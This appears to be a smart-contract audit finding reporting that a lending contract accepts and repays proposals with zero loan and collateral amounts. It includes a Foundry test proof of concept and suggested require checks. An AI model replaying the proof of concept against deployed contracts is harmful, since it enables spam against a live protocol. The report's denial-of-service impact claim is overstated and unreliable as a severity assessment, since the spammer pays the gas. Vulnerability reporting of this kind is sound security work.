# Anyone can make proposals with zero of loanAmount and collateralAmount

### Summary

The acceptBorrowRequest(), acceptLoanOffer() and refinance() functions, along with the repayment process, do not prevent proposals with a loanAmount = 0 and collateralAmount = 0 from being accepted and repaid. This can lead to an ineffective use of gas, potential system abuse, and confusion for both users and the protocol. The ability to create and process such proposals introduces a significant risk of Denial-of-Service (DoS) through spam or inefficient transaction processing.

### Root Cause

The lack of input validation to ensure that both loanAmount and collateralAmount are greater than zero allows users to submit, accept, and repay proposals that provide no actual economic value.

### Internal pre-conditions

The loanAmount and collateralAmount fields in the proposal are set to 0.
The protocol does not validate that both the loanAmount and collateralAmount are greater than 0 when accepting or processing proposals.

### External pre-conditions

A user creates a proposal with loanAmount = 0 and collateralAmount = 0.
The contract does not check if the loanAmount or collateralAmount are non-zero before allowing the proposal to be accepted or repaid.

### Attack Path

An attacker creates a proposal with loanAmount = 0 and collateralAmount = 0.
The attacker calls acceptBorrowRequest() or acceptLoanOffer() to accept the zero-value proposal.
The protocol processes the proposal, wasting gas and resources with no actual transfer of value.
After the proposal is accepted, the borrower repays the loan, which is technically a repayment of 0, consuming gas but providing no economic benefit.

### Impact

Attackers could submit numerous zero-value proposals to clog the system, forcing the protocol to process meaningless transactions, leading to a Denial-of-Service (DoS) by exhausting resources.
Processing zero-value proposals does not provide any economic benefit, making it an unnecessary burden on the system and users.

### PoC

```solidity
function testPoC() public {
    uint8 protocolFeeBasisPoints = 100;
    _updateProtocolFeeRecipientAndBasisPoints(protocolFeeBasisPoints);

    IPredictDotLoan.Proposal memory proposal;
    proposal.loanAmount = 0;
    proposal.collateralAmount = 0;
    proposal.duration = LOAN_DURATION;
    proposal.validUntil = vm.getBlockTimestamp() + 1 days;

    proposal.questionId = questionId;
    proposal.questionType = IPredictDotLoan.QuestionType.Binary;
    proposal.outcome = true;
    proposal.interestRatePerSecond = INTEREST_RATE_PER_SECOND;
    proposal.salt = uint256(vm.load(address(predictDotLoan), bytes32(uint256(8))));
    proposal.protocolFeeBasisPoints = protocolFeeBasisPoints;
    
    proposal.from = borrower;
    proposal.proposalType = IPredictDotLoan.ProposalType.BorrowRequest;

    (, uint128 borrowingNonce) = predictDotLoan.nonces(lender);
    proposal.nonce = borrowingNonce;

    proposal.signature = _signProposal(proposal, borrowerPrivateKey);

    vm.prank(lender);
    predictDotLoan.acceptBorrowRequest(proposal, proposal.loanAmount);

    vm.warp(vm.getBlockTimestamp() + 12 hours);

    uint256 debt = predictDotLoan.calculateDebt(1);

    vm.startPrank(borrower);
    mockERC20.approve(address(predictDotLoan), debt);
    predictDotLoan.repay(1);
    vm.stopPrank();
}
```

### Mitigation

Ensure that both loanAmount and collateralAmount are greater than zero before allowing the proposal to be accepted. If either value is zero, the transaction should revert with an appropriate error message.
```solidity
function _assertProposalValidity(
        bytes32 proposalId,
        Proposal calldata proposal,
        uint256 positionId,
        uint256 fulfillAmount
    ) private view {
    require(proposal.loanAmount > 0, "Loan amount must be greater than zero");
    require(proposal.collateralAmount > 0, "Collateral amount must be greater than zero");
    ...
}

function _refinance(
    Refinancing calldata refinancing
) private returns (uint256 id, Loan memory newLoan, uint256 protocolFee) {
    Proposal calldata proposal = refinancing.proposal;
    _assertProposalIsLoanOffer(proposal);

    require(proposal.loanAmount > 0, "Loan amount must be greater than zero");
    require(proposal.collateralAmount > 0, "Collateral amount must be greater than zero");
    ...
}
```
